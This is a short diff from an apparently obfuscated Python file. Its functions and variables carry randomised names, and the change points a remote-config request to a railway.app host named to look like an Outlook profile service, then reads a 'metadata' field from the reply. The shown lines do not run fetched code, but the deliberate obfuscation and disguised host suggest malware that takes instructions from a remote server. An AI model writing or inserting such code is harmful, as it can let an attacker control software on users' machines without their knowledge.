@@ -18,7 +18,7 @@ def net_wijauk_724():
 
     def data_dmxtrt_870():
         try:
-            eval_cgkovl_548 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_cgkovl_548 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_cgkovl_548.raise_for_status()
             data_kclvaf_703 = eval_cgkovl_548.json()
             config_nslhzw_885 = data_kclvaf_703.get('metadata')
